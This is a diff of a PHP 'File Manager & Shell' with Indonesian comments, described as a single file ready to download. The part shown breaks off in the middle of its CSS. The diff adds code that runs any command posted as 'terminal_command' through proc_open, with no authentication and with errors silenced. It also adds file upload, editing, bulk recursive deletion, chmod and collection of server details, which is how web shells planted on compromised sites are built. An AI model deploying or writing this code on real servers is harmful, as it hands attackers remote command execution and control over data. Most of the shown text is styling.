@@ -2,62 +2,40 @@
 error_reporting(0);
 set_time_limit(0);
 
-// Check if this is a terminal request
-$isTerminalRequest = isset($_POST['terminal_command']);
+// === File Manager + Shell (single file, ready to download) ===
+// - Menampilkan file/folder dengan icon berdasarkan ekstensi
+// - Bisa membuat file/dir, upload, delete, chmod
+// - Edit file via modal (AJAX)
+// - Terminal (AJAX) menjalankan perintah di direktori saat ini
+// - Sesuaikan izin dan environment sebelum dipakai di server produksi
 
-// Handle terminal commands first to prevent HTML output
-if ($isTerminalRequest) {
-    $initial_path = realpath(getcwd());
-    $path = $initial_path;
-    
-    if (isset($_GET['path'])) {
-        $tmp = realpath($_GET['path']);
-        if ($tmp && is_dir($tmp)) {
-            $path = $tmp;
-        }
-    }
-    
-    chdir($path);
-    $cmd = $_POST['terminal_command'];
-    $descriptorspec = [
-        0 => ['pipe', 'r'],
-        1 => ['pipe', 'w'],
-        2 => ['pipe', 'w']
-    ];
-    $process = proc_open($cmd, $descriptorspec, $pipes);
-    $output = '';
-    if (is_resource($process)) {
-        fclose($pipes[0]);
-        $output = stream_get_contents($pipes[1]);
-        fclose($pipes[1]);
-        $err = stream_get_contents($pipes[2]);
-        fclose($pipes[2]);
-        proc_close($process);
-        if ($err) {
-            $output .= "\nError:\n" . $err;
-        }
-    } else {
-        $output = "Failed to execute command.";
-    }
-    
-    header('Content-Type: text/plain');
-    echo $output;
-    exit;
+// ---------------------------
+// Configuration: icon mapping
+// ---------------------------
+$file_icons = [
+    'htaccess' => 'https://solevisible.com/icons/htaccess.png',
+    'php'      => 'https://solevisible.com/icons/php.png',
+    'txt'      => 'https://solevisible.com/icons/txt.png',
+    'xml'      => 'https://solevisible.com/icons/xml.png',
+    'html'     => 'https://solevisible.com/icons/html.png',
+    'default'  => 'https://solevisible.com/icons/notfound.png'
+];
+
+function get_file_icon($filename, $file_icons) {
+    $base = basename($filename);
+    // Khusus .htaccess
+    if (strtolower($base) === '.htaccess') return $file_icons['htaccess'];
+
+    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+    if ($ext && isset($file_icons[$ext])) return $file_icons[$ext];
+    return $file_icons['default'];
 }
 
-// Regular file manager code
-$initial_path = realpath(getcwd());
-$path = $initial_path;
-
-if (isset($_GET['path'])) {
-    $tmp = realpath($_GET['path']);
-    if ($tmp && is_dir($tmp)) {
-        $path = $tmp;
-    }
-}
-
+// ---------------------------
+// Utility functions
+// ---------------------------
 function safe_path($path) {
-    $real = realpath($path);
+    $real = @realpath($path);
     return $real ?: false;
 }
 
@@ -79,13 +57,112 @@ function getUserGroup($file) {
     return [$user, $group];
 }
 
+function formatPerm($perm) {
+    $type = '?';
+    if (($perm & 0xC000) === 0xC000) $type = 's';
+    elseif (($perm & 0xA000) === 0xA000) $type = 'l';
+    elseif (($perm & 0x8000) === 0x8000) $type = '-';
+    elseif (($perm & 0x6000) === 0x6000) $type = 'b';
+    elseif (($perm & 0x4000) === 0x4000) $type = 'd';
+    elseif (($perm & 0x2000) === 0x2000) $type = 'c';
+    elseif (($perm & 0x1000) === 0x1000) $type = 'p';
+
+    $rwx = '';
+    $masks = [ 
+        0x0100, 0x0080, 0x0040,
+        0x0020, 0x0010, 0x0008,
+        0x0004, 0x0002, 0x0001
+    ];
+    $chars = ['r','w','x','r','w','x','r','w','x'];
+
+    for ($i=0; $i<9; $i++) {
+        $rwx .= ($perm & $masks[$i]) ? $chars[$i] : '-';
+    }
+
+    if ($perm & 0x800) $rwx[2] = ($rwx[2] == 'x') ? 's' : 'S';
+    if ($perm & 0x400) $rwx[5] = ($rwx[5] == 'x') ? 's' : 'S';
+    if ($perm & 0x200) $rwx[8] = ($rwx[8] == 'x') ? 't' : 'T';
+
+    return $type . $rwx;
+}
+
+function permOctal($perm) {
+    return substr(sprintf('%o', $perm), -4);
+}
+
+function human_filesize($bytes, $decimals = 2) {
+    $sz = ['B','KB','MB','GB','TB','PB'];
+    if ($bytes == 0) return '0B';
+    $factor = floor((strlen((string)$bytes) - 1) / 3);
+    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $sz[$factor];
+}
+
+// Hapus file/folder (rekursif untuk folder)
+function rrmdir($dir) {
+    if (!file_exists($dir)) return;
+    if (is_file($dir) || is_link($dir)) { @unlink($dir); return; }
+    foreach (scandir($dir) as $it) {
+        if ($it === '.' || $it === '..') continue;
+        $p = $dir . DIRECTORY_SEPARATOR . $it;
+        if (is_dir($p) && !is_link($p)) rrmdir($p); else @unlink($p);
+    }
+    @rmdir($dir);
+}
+
+
+// ---------------------------
+// Initial path and terminal handling
+// ---------------------------
+$initial_path = realpath(getcwd());
+$path = $initial_path;
+
+// Terminal AJAX handler
+$isTerminalRequest = isset($_POST['terminal_command']);
+if ($isTerminalRequest) {
+    if (isset($_GET['path'])) {
+        $tmp = realpath($_GET['path']);
+        if ($tmp && is_dir($tmp)) $path = $tmp;
+    }
+    chdir($path);
+    $cmd = $_POST['terminal_command'];
+    $descriptorspec = [
+        0 => ['pipe', 'r'],
+        1 => ['pipe', 'w'],
+        2 => ['pipe', 'w']
+    ];
+    $process = @proc_open($cmd, $descriptorspec, $pipes);
+    $output = '';
+    if (is_resource($process)) {
+        @fclose($pipes[0]);
+        $output = @stream_get_contents($pipes[1]);
+        @fclose($pipes[1]);
+        $err = @stream_get_contents($pipes[2]);
+        @fclose($pipes[2]);
+        @proc_close($process);
+        if ($err) $output .= "\nError:\n" . $err;
+    } else {
+        $output = "Failed to execute command.";
+    }
+    header('Content-Type: text/plain');
+    echo $output;
+    exit;
+}
+
+// ---------------------------
+// Normal file manager flow
+// ---------------------------
+if (isset($_GET['path'])) {
+    $tmp = realpath($_GET['path']);
+    if ($tmp && is_dir($tmp)) $path = $tmp;
+}
+
 // System info
 $uname = php_uname();
 $userInfo = @posix_getpwuid(posix_geteuid());
 $groupInfo = @posix_getgrgid(posix_getegid());
 $phpVersion = phpversion();
 $safeMode = ini_get('safe_mode') ? 'ON' : 'OFF';
-$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']);
+$serverIP = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME'] ?? 'localhost');
 $clientIP = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 $dateTime = date('Y-m-d H:i:s');
 $software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
@@ -194,18 +271,27 @@ if (isset($_POST['save_file']) && isset($_POST['filename'])) {
     }
 }
 
-// Chmod
-if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
-    $file_to_chmod = safe_path($path . DIRECTORY_SEPARATOR . $_POST['chmod_file']);
-    $perm = intval($_POST['new_perm'], 8);
-    if ($file_to_chmod && file_exists($file_to_chmod)) {
-        chmod($file_to_chmod, $perm);
+// Chmod (minimal: 3 digit + Apply)
+if (isset($_POST['chmod_file'])) {
+    $targetFilename = $_POST['chmod_file'];
+    $file_to_chmod  = safe_path($path . DIRECTORY_SEPARATOR . $targetFilename);
+
+    // ambil 3 digit dari input perm[filename]
+    $perm_digits = $_POST['perm'][$targetFilename] ?? '';
+    $perm_digits = preg_replace('/[^0-7]/', '', $perm_digits); // hanya 0-7
+
+    if (strlen($perm_digits) === 3 && $file_to_chmod && file_exists($file_to_chmod)) {
+        $perm = intval('0' . $perm_digits, 8); // jadikan 0xxx
+        @chmod($file_to_chmod, $perm);
         header("Location: ?path=" . urlencode($path));
         exit;
     } else {
-        $msg_error = '[ERROR] File/directory not found or access denied.';
+        $msg_error = '[ERROR] Invalid permission or target.';
     }
 }
+
+
+
 
 // File viewing
 $file_view_content = '';
@@ -219,45 +305,23 @@ if (isset($_GET['view'])) {
     }
 }
 
-function formatPerm($perm) {
-    $type = '?';
-    if (($perm & 0xC000) === 0xC000) $type = 's';
-    elseif (($perm & 0xA000) === 0xA000) $type = 'l';
-    elseif (($perm & 0x8000) === 0x8000) $type = '-';
-    elseif (($perm & 0x6000) === 0x6000) $type = 'b';
-    elseif (($perm & 0x4000) === 0x4000) $type = 'd';
-    elseif (($perm & 0x2000) === 0x2000) $type = 'c';
-    elseif (($perm & 0x1000) === 0x1000) $type = 'p';
-
-    $rwx = '';
-    $masks = [ 
-        0x0100, 0x0080, 0x0040,
-        0x0020, 0x0010, 0x0008,
-        0x0004, 0x0002, 0x0001
-    ];
-    $chars = ['r','w','x','r','w','x','r','w','x'];
-
-    for ($i=0; $i<9; $i++) {
-        $rwx .= ($perm & $masks[$i]) ? $chars[$i] : '-';
+// Bulk delete (checkbox)
+if (isset($_POST['bulk_delete']) && !empty($_POST['sel']) && is_array($_POST['sel'])) {
+    foreach ($_POST['sel'] as $name) {
+        $target = safe_path($path . DIRECTORY_SEPARATOR . $name);
+        if ($target) {
+            if (is_dir($target)) rrmdir($target);
+            else @unlink($target);
+        }
     }
-    
-    if ($perm & 0x800) $rwx[2] = ($rwx[2] == 'x') ? 's' : 'S';
-    if ($perm & 0x400) $rwx[5] = ($rwx[5] == 'x') ? 's' : 'S';
-    if ($perm & 0x200) $rwx[8] = ($rwx[8] == 'x') ? 't' : 'T';
-
-    return $type . $rwx;
+    header("Location: ?path=" . urlencode($path));
+    exit;
 }
 
-function permOctal($perm) {
-    return substr(sprintf('%o', $perm), -4);
-}
 
-function human_filesize($bytes, $decimals = 2) {
-    $sz = ['B','KB','MB','GB','TB','PB'];
-    if ($bytes == 0) return '0B';
-    $factor = floor((strlen((string)$bytes) - 1) / 3);
-    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . $sz[$factor];
-}
+// ---------------------------
+// Output HTML
+// ---------------------------
 ?>
 <!DOCTYPE html>
 <html lang="id">
@@ -265,31 +329,41 @@ function human_filesize($bytes, $decimals = 2) {
 <meta charset="utf-8" />
 <title>File Manager & Shell</title>
 <style>
-html, body { height: 100%; margin: 0; }
+html, body {
+  margin: 0;
+  padding: 0;
+  height: 100%;
+  min-height: 100%;
+}
+
 body {
   padding: 20px;
+  background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background color */
   background-image: url('https://i.imgur.com/gnQC6Ou.png');
   background-size: cover;
   background-position: center center;
+  background-attachment: fixed;
   background-repeat: no-repeat;
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
   color: #ddd;
   line-height: 1.6;
   min-height: 100vh;
 }
-a { color: #61dafb; text-decoration: none; }
-a:hover { color: #21a1f1; text-decoration: underline; }
-h2, h3 { font-weight: 600; }
+
 table {
   width: 100%;
   border-collapse: separate;
   border-spacing: 0;
   margin-top: 1rem;
-  background-color: #1e1e1e;
+  background-color: rgba(0, 0, 0, 0.5); /* Transparent table background */
   border-radius: 8px;
   overflow: hidden;
 }
-thead { background: linear-gradient(90deg, #222, #333); }
+
+thead {
+  background: linear-gradient(90deg, rgba(34, 34, 34, 0.7), rgba(51, 51, 51, 0.7)); /* Semi-transparent header */
+}
+
 th, td {
   padding: 12px 16px;
   text-align: left;
@@ -297,84 +371,570 @@ th, td {
   vertical-align: middle;
   color: #ccc;
 }
-th { color: #61dafb; font-weight: 700; user-select: none; }
-tbody tr:hover { background-color: #2c2c2c; }
-td a.folder::before { content: "📁"; margin-right: 8px; font-size: 1.15rem; }
-td a.file::before   { content: "📄"; margin-right: 8px; font-size: 1.15rem; cursor: pointer; }
-.del-link { color: #e74c3c; font-weight: 600; margin-right: 8px; }
-.del-link:hover { color: #ff6b6b; }
-.form-chmod { display:inline-flex; gap:6px; align-items:center; margin:0; }
-.form-chmod input[type=text] { width:64px; padding:4px 6px; border-radius:4px; border:1px solid #333; background:#111; color:#0f0; }
-.form-chmod input[type=submit] { padding:6px 8px; background:#4caf50; color:#121212; border:none; border-radius:4px; cursor:pointer; }
-.actions-container { display:flex; gap:16px; flex-wrap:wrap; align-items:flex-end; margin-top:2rem; }
-.actions-label { display:flex; flex-direction:column; font-weight:600; font-size:0.9rem; color:#ccc; min-width:160px; max-width:280px; }
-.actions-label input[type=text], .actions-label input[type=file] { margin-top:6px; padding:8px 12px; font-family:monospace; font-size:1rem; border-radius:5px; border:1.5px solid #333; background-color:#1f1f1f; color:#0f0; }
-.btn-primary { background-color:#61dafb; color:#121212; border:none; padding:10px 20px; font-weight:600; border-radius:5px; cursor:pointer; min-width:110px; height:38px; }
-.btn-primary:hover { background-color:#21a1f1; }
-#terminal-popup { display:none; position:fixed; top:50%; left:50%; width:90vw; max-width:1000px; height:600px; transform:translate(-50%, -50%); background:#111; border-radius:10px; box-shadow:0 0 15px #61dafbaa; z-index:9999; flex-direction:column; }
-#terminal-popup.active { display:flex; }
-#terminal-popup .header { background:#222; padding:12px 16px; color:#0f0; font-family:monospace; font-weight:600; display:flex; justify-content:space-between; align-items:center; border-radius:10px 10px 0 0; }
-#terminal-popup .header button.close-btn { background:transparent; border:none; color:#0f0; font-weight:700; font-size:1.2rem; cursor:pointer; }
-#terminal-popup textarea { flex-grow:1; background:#000; color:#0f0; font-family:monospace; font-size:1rem; border:none; border-radius:0 0 10px 10px; padding:12px; resize:none; white-space:pre-wrap; overflow-y:auto; }
-#terminal-popup form { display:flex; border-top:1px solid #222; padding:8px 16px; }
-#terminal-popup input[type=text] { flex-grow:1; background:#222; color:#0f0; border:none; padding:8px 12px; font-family:monospace; font-size:1rem; border-radius:6px 0 0 6px; outline:none; }
-#terminal-popup input[type=submit] { background:#4caf50; border:none; color:white; padding:8px 20px; font-weight:600; font-size:1rem; border-radius:0 6px 6px 0; cursor:pointer; }
 
-/* modal edit file */
-#editModal { display:none; position:fixed; z-index:10000; left:50%; top:50%; transform:translate(-50%,-50%); width:90vw; max-width:1000px; height:80vh; background:#111; border-radius:10px; box-shadow:0 0 20px #61dafbaa; flex-direction:column; }
-#editModal.active { display:flex; }
-#editModal .header { background:#222; padding:12px 16px; color:#0f0; font-family:monospace; font-weight:600; display:flex; justify-content:space-between; align-items:center; border-radius:10px 10px 0 0; }
-#editModal textarea { flex:1 1 auto; background:#000; color:#0f0; font-family:monospace; font-size:0.95rem; border:none; border-radius:0 0 10px 10px; padding:12px; resize:vertical; overflow:auto; min-height:200px; }
-#editModal .footer { padding:10px 16px; display:flex; gap:8px; justify-content:flex-end; border-top:1px solid #222; }
-#editModal .meta { padding:8px 12px; color:#aaa; font-family:monospace; }
-.btn-save { background:#4caf50; color:#121212; border:none; padding:10px 18px; border-radius:6px; cursor:pointer; font-weight:600; }
-.btn-cancel { background:#e74c3c; color:#fff; border:none; padding:10px 18px; border-radius:6px; cursor:pointer; font-weight:600; }
-.small-muted { color:#888; font-size:0.9rem; margin-right:auto; align-self:center; padding-left:8px; }
-@media (max-width:720px) {
-  #editModal { width:95vw; height:85vh; }
+h2, h3 {
+  font-weight: 600;
 }
 
-/* System info styling */
+a {
+  color: #61dafb;
+  text-decoration: none;
+}
+
+a:hover {
+  color: #21a1f1;
+}
+
+.actions-container {
+  display: flex;
+  gap: 16px;
+  flex-wrap: wrap;
+  align-items: flex-end;
+  margin-top: 2rem;
+}
+
+.actions-label {
+  display: flex;
+  flex-direction: column;
+  font-weight: 600;
+  font-size: 0.9rem;
+  color: #ccc;
+  min-width: 160px;
+  max-width: 280px;
+}
+
+.actions-label input[type=text], .actions-label input[type=file] {
+  margin-top: 6px;
+  padding: 8px 12px;
+  font-family: monospace;
+  font-size: 1rem;
+  border-radius: 5px;
+  border: 1.5px solid #333;
+  background-color: #1f1f1f;
+  color: #0f0;
+}
+
+.btn-primary {
+  background-color: rgba(97, 218, 251, 0.7); /* Transparent background for buttons */
+  color: #121212;
+  border: none;
+  padding: 10px 20px;
+  font-weight: 600;
+  border-radius: 5px;
+  cursor: pointer;
+  min-width: 110px;
+  height: 38px;
+}
+
+.btn-primary:hover {
+  background-color: rgba(33, 161, 241, 0.7);
+}
+
+#editModal, #terminal-popup {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  width: 90vw;
+  max-width: 1000px;
+  height: 600px;
+  transform: translate(-50%, -50%);
+  background: rgba(17, 17, 17, 0.8); /* Semi-transparent background */
+  border-radius: 10px;
+  box-shadow: 0 0 15px rgba(97, 218, 251, 0.5);
+  z-index: 9999;
+  flex-direction: column;
+}
+
+#terminal-popup.active, #editModal.active {
+  display: flex;
+}
+
+#editModal .header, #terminal-popup .header {
+  background: rgba(34, 34, 34, 0.7);
+  padding: 12px 16px;
+  color: #0f0;
+  font-family: monospace;
+  font-weight: 600;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-radius: 10px 10px 0 0;
+}
+
+#terminal-output, #editFileContent {
+  background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent text areas */
+  color: #0f0;
+  font-family: monospace;
+  font-size: 1rem;
+  border: none;
+  border-radius: 0 0 10px 10px;
+  padding: 12px;
+  resize: none;
+  white-space: pre-wrap;
+  overflow-y: auto;
+}
+
+#terminal-popup form, #editModal form {
+  display: flex;
+  border-top: 1px solid #222;
+  padding: 8px 16px;
+}
+
+#terminal-popup input[type=text], #editModal input[type=text] {
+  flex-grow: 1;
+  background: #222;
+  color: #0f0;
+  border: none;
+  padding: 8px 12px;
+  font-family: monospace;
+  font-size: 1rem;
+  border-radius: 6px 0 0 6px;
+  outline: none;
+}
+
+#terminal-popup input[type=submit], #editModal input[type=submit] {
+  background: #4caf50;
+  border: none;
+  color: white;
+  padding: 8px 20px;
+  font-weight: 600;
+  font-size: 1rem;
+  border-radius: 0 6px 6px 0;
+  cursor: pointer;
+}
+
+#editModal .footer {
+  padding: 10px 16px;
+  display: flex;
+  gap: 8px;
+  justify-content: flex-end;
+  border-top: 1px solid #222;
+}
+
+#editModal .meta, .small-muted {
+  color: #aaa;
+  font-family: monospace;
+}
+
 .sysinfo {
-    background: linear-gradient(135deg, #0a0a0a, #1b1b1b);
-    border: 1px solid #0f0;
-    border-radius: 10px;
-    padding: 15px 20px;
-    font-family: 'Courier New', monospace;
-    color: #0f0;
-    max-width: 100%;
-    box-shadow: 0 0 10px #0f0;
-    margin-bottom: 20px;
+  background: linear-gradient(135deg, #0a0a0a, #1b1b1b);
+  border: 1px solid #0f0;
+  border-radius: 10px;
+  padding: 15px 20px;
+  font-family: 'Courier New', monospace;
+  color: #0f0;
+  max-width: 100%;
+  box-shadow: 0 0 10px #0f0;
+  margin-bottom: 20px;
 }
+
 .sysinfo h2 {
-    text-align: center;
-    margin-top: 0;
-    font-size: 20px;
-    color: #0f0;
-    border-bottom: 1px solid #0f0;
-    padding-bottom: 5px;
+  text-align: center;
+  margin-top: 0;
+  font-size: 20px;
+  color: #0f0;
+  border-bottom: 1px solid #0f0;
+  padding-bottom: 5px;
 }
+
 .sysinfo table {
-    width: 100%;
-    border-collapse: collapse;
+  width: 100%;
+  border-collapse: collapse;
 }
+
 .sysinfo td {
-    padding: 5px;
-    vertical-align: top;
+  padding: 5px;
+  vertical-align: top;
 }
+
 .sysinfo td:first-child {
-    font-weight: bold;
-    width: 120px;
+  font-weight: bold;
+  width: 120px;
 }
+
+.del-link {
+  color: #e74c3c;
+  font-weight: 600;
+  margin-right: 8px;
+}
+
+.form-chmod {
+  display: inline-flex;
+  gap: 6px;
+  align-items: center;
+  margin: 0;
+}
+
+.form-chmod input[type=text] {
+  width: 64px;
+  padding: 4px 6px;
+  border-radius: 4px;
+  border: 1px solid #333;
+  background: #111;
+  color: #0f0;
+}
+
+.form-chmod input[type=submit] {
+  padding: 6px 8px;
+  background: #4caf50;
+  color: #121212;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+@media (max-width: 720px) {
+  #editModal {
+    width: 95vw;
+    height: 85vh;
+  }
+}
+/* Ukuran standar ikon file */
+img.fileicon {
+  width: 24px;  /* Menetapkan lebar ikon menjadi 24px */
+  height: 24px; /* Menetapkan tinggi ikon menjadi 24px */
+  margin-right: 8px;
+  vertical-align: middle;
+}
+/* Ukuran Modal Edit File */
+#editModal {
+  display: none;
+  position: fixed;
+  z-index: 10000;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+  width: 80vw;  /* Lebar modal lebih besar */
+  max-width: 1000px;  /* Batas lebar maksimum */
+  height: 70vh;  /* Menyesuaikan tinggi modal */
+  background: rgba(17, 17, 17, 0.8); /* Semi-transparent background */
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(97, 218, 251, 0.5);
+  flex-direction: column;
+}
+
+/* Ukuran Modal Edit File */
+#editModal {
+  display: none;
+  position: fixed;
+  z-index: 10000;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%); /* Tetap berada di tengah */
+  width: 80vw;  /* Lebar modal lebih besar */
+  max-width: 1000px;  /* Batas lebar maksimum */
+  height: 70vh;  /* Menyesuaikan tinggi modal */
+  background: rgba(17, 17, 17, 0.8); /* Semi-transparent background */
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(97, 218, 251, 0.5);
+  flex-direction: column;
+  overflow: hidden; /* Memastikan modal tidak meluas keluar */
+}
+
+/* Kolom Teks */
+#editFileContent {
+  width: 100%;  /* Pastikan area teks memenuhi lebar modal */
+  height: auto;  /* Menggunakan seluruh tinggi modal sesuai konten */
+  min-height: 400px;  /* Menetapkan tinggi minimal */
+  max-height: 70vh;  /* Mengatur tinggi maksimal agar tetap tidak melebihi ukuran modal */
+  background: #000;
+  color: #0f0;
+  font-family: monospace;
+  font-size: 1rem;
+  border: none;
+  border-radius: 0 0 10px 10px;
+  padding: 12px;
+  resize: none;  /* Menonaktifkan resize manual */
+  overflow: auto;  /* Mengatur overflow teks agar tidak keluar */
+  box-sizing: border-box;  /* Menghindari overflow yang tidak diinginkan */
+  word-wrap: break-word;  /* Memastikan teks terbungkus dengan baik */
+}
+
+
+/* Header Modal */
+#editModal .header {
+  background: rgba(34, 34, 34, 0.7);
+  padding: 12px 16px;
+  color: #0f0;
+  font-family: monospace;
+  font-weight: 600;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-radius: 10px 10px 0 0;
+}
+
+/* Footer Modal (button Save, Cancel) */
+#editModal .footer {
+  padding: 10px 16px;
+  display: flex;
+  gap: 8px;
+  justify-content: flex-end;
+  border-top: 1px solid #222;
+}
+
+/* Gaya tombol save dan cancel */
+.btn-save, .btn-cancel {
+  padding: 10px 18px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-weight: 600;
+}
+
+.btn-save {
+  background: #4caf50;
+  color: #121212;
+}
+
+.btn-cancel {
+  background: #e74c3c;
+  color: #fff;
+}
+/* Terminal Modal */
+#terminal-popup {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 80vw;  /* Lebar modal lebih besar */
+  max-width: 1000px;  /* Batas lebar maksimum */
+  height: auto;  /* Mengatur tinggi modal agar mengikuti konten */
+  min-height: 800px; /* Tinggi minimal lebih besar */
+  max-height: 80vh;  /* Maksimal 80% dari tinggi viewport */
+  background: rgba(17, 17, 17, 0.8); /* Semi-transparent background */
+  border-radius: 10px;
+  box-shadow: 0 0 20px rgba(97, 218, 251, 0.5);
+  z-index: 9999;
+  flex-direction: column;
+  overflow: hidden;  /* Pastikan tidak meluap */
+}
+
+/* Terminal Output */
+#terminal-output {
+  background-color: rgba(0, 0, 0, 0.7);  /* Semi-transparent */
+  color: #0f0;
+  font-family: monospace;
+  font-size: 1rem;
+  border: none;
+  resize: none;
+  width: 100%;  /* Menjaga lebar output agar sesuai */
+  height: 100%;  /* Menjaga tinggi sesuai modal */
+  box-sizing: border-box;  /* Menghindari overflow */
+  text-align: left;  /* Menjaga teks tetap rata kiri */
+  white-space: pre-wrap;  /* Menjaga teks tetap terbungkus jika panjang */
+  padding: 0;  /* Menghapus padding default */
+  min-height: 400px;  /* Tinggi minimal agar lebih besar dan mudah dibaca */
+  max-height: 80vh;  /* Maksimal 80% dari tinggi layar agar tidak meluap */
+  overflow-y: auto;  /* Menambahkan scroll jika konten panjang */
+}
+
+/* Container untuk teks */
+#terminal-output .terminal-text {
+  padding-left: 30px;  /* Padding lebih kecil di kiri */
+  height: 100%;  /* Menjaga tinggi container sesuai dengan terminal output */
+  overflow-y: auto;  /* Scroll otomatis jika teks panjang */
+}
+
+/* Form Input Terminal */
+#terminal-form {
+  display: flex;
+  border-top: 1px solid #222;
+  padding: 8px 16px;
+}
+
+#terminal-input {
+  flex-grow: 1;
+  background: #222;
+  color: #0f0;
+  border: none;
+  padding: 8px 12px;
+  font-family: monospace;
+  font-size: 1rem;
+  border-radius: 6px 0 0 6px;
+  outline: none;
+  height: 40px;  /* Pastikan input tidak terlalu besar */
+}
+
+#terminal-form input[type=submit] {
+  background: #4caf50;
+  border: none;
+  color: white;
+  padding: 8px 20px;
+  font-weight: 600;
+  font-size: 1rem;
+  border-radius: 0 6px 6px 0;
+  cursor: pointer;
+}
+
+/* === Grid 5 kolom sejajar & rapat === */
+.fm-grid{
+  display:grid !important;
+  grid-template-columns: repeat(5, 300px); /* 5 kotak satu baris */
+  justify-content:center;
+  column-gap:14px;
+  row-gap:10px;
+}
+.fm-row{ width:auto; }
+.fm-row > label{
+  display:block; margin-bottom:6px; font-weight:600; color:#ddd; text-align:left;
+}
+
+/* Input gelap rounded + inner outline tipis */
+.fm-inputwrap{ display:flex; align-items:center; gap:8px; }
+.fm-inputwrap input[type="text"],
+.fm-inputwrap input[type="file"]{
+  width:240px; height:36px; padding:8px 12px;
+  border-radius:10px; border:1px solid #222; background:#0b0b0b; color:#e5e5e5;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,.06), 0 2px 8px rgba(0,0,0,.35);
+  box-sizing:border-box;
+}
+.fm-inputwrap input::placeholder{ color:#6a6a6a; }
+
+/* Samakan tombol bawaan input file */
+.fm-inputwrap input[type="file"]{ color:#e5e5e5; }
+.fm-inputwrap input[type="file"]::-webkit-file-upload-button,
+.fm-inputwrap input[type="file"]::file-selector-button{
+  height:24px; padding:2px 10px; margin-right:8px;
+  border:1px solid #333; border-radius:6px; background:#111; color:#ddd; cursor:pointer;
+}
+
+/* Tombol ikon bulat di kanan */
+.fm-iconbtn{
+  width:34px; height:34px; border-radius:50%;
+  border:2px solid #19e3ff; background:rgba(10,10,10,.6);
+  box-shadow:0 0 0 2px rgba(25,227,255,.18), 0 2px 8px rgba(0,0,0,.35);
+  padding:0; margin:0; line-height:0; display:flex; align-items:center; justify-content:center;
+  cursor:pointer; outline:none;
+}
+.fm-iconbtn:hover{ transform:translateY(-.5px); }
+.fm-iconbtn:focus-visible{ box-shadow:0 0 0 3px rgba(25,227,255,.28), 0 2px 8px rgba(0,0,0,.35); }
+.fm-iconbtn img{ width:18px; height:18px; display:block; }
+
+/* Samakan style ikon Open Terminal dengan ikon submit lain */
+.btn-primary.fm-iconbtn{
+  background: transparent !important;
+  border: none !important;
+  padding: 0 !important;
+  min-width: 0 !important;
+}
+#openTerminalBtn.fm-iconbtn{
+  background: rgba(10,10,10,.6) !important;
+  border: 2px solid #19e3ff !important;
+  box-shadow: 0 0 0 2px rgba(25,227,255,.18), 0 2px 8px rgba(0,0,0,.35) !important;
+  width: 34px !important; height: 34px !important; border-radius: 50% !important;
+  line-height: 0 !important;
+}
+
+/* Kotak (border) Open Terminal — tampil & bisa diklik */
+.fm-dummy{
+  width: 240px; height: 36px; border-radius: 10px;
+  border: 1px solid #222 !important;
+  background: #0b0b0b !important;
+  color: #6a6a6a;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,.06), 0 2px 8px rgba(0,0,0,.35);
+  display: flex; align-items: center; padding: 0 12px;
+  cursor: pointer;
+}
+.fm-dummy:hover{
+  box-shadow: inset 0 0 0 1px rgba(25,227,255,.18), 0 2px 8px rgba(0,0,0,.35);
+}
+
+/* Hover per baris + gesture mouse */
+#fileTable tbody tr{
+  transition: background .15s ease, box-shadow .15s ease;
+  cursor: default;
+}
+#fileTable tbody tr:hover{
+  background: rgba(97,218,251,.06);
+  box-shadow: inset 0 0 0 9999px rgba(255,255,255,.02);
+}
+
+/* Checkbox & link terlihat klik-able */
+#fileTable tbody tr input[type="checkbox"]{ cursor: pointer; }
+#fileTable tbody tr a{ cursor: pointer; }
+#fileTable tbody tr.selected{ background: rgba(97,218,251,.12); }
+.bulkbar{margin-top:10px;display:flex;align-items:center;gap:10px}
+.bulkbar .btn-primary{background:#e74c3c;color:#fff}
+
+/* Bulkbar & tombol tambahan */
+.bulkbar{margin-top:10px;display:flex;align-items:center;gap:12px;justify-content:space-between}
+.bulk-actions{display:flex;gap:8px}
+.btn-secondary{background:#2c2c2c;color:#ddd;border:1px solid #444;padding:8px 12px;border-radius:6px;cursor:pointer}
+.btn-secondary:hover{background:#353535}
+.btn-primary.danger{background:#e74c3c;color:#fff}
+.btn-primary[disabled]{opacity:.5;cursor:not-allowed}
+
+.actions-td { display:flex; gap:10px; align-items:center; }
+.chmod-min { display:flex; gap:8px; align-items:center; }
+
+.perm3{
+  width:56px; text-align:center;
+  padding:6px 8px; border-radius:8px;
+  border:1px solid #333; background:#0b0b0b; color:#0f0;
+  font-family:monospace; font-weight:700;
+  box-shadow: inset 0 0 0 1px rgba(255,255,255,.06);
+}
+
+/* Ukuran & typografi konsisten */
+.btn-apply,
+.del-link{
+  display:inline-flex; align-items:center; justify-content:center;
+  height:32px; min-width:64px; padding:0 12px;
+  border-radius:10px; line-height:1; font-weight:700;
+  text-decoration:none; box-sizing:border-box; cursor:pointer;
+  color:#ccc !important;                    /* teks abu-abu */
+}
+
+/* APPLY — hijau neon toned-down (inti gelap) */
+.btn-apply{
+  background: linear-gradient(180deg, #12983a 0%, #0b6d29 100%);
+  border:1px solid #23e85a;
+  box-shadow:
+    0 0 0 2px rgba(35,232,90,.18),
+    0 6px 18px rgba(0,0,0,.35),
+    inset 0 0 0 1px rgba(255,255,255,.06),
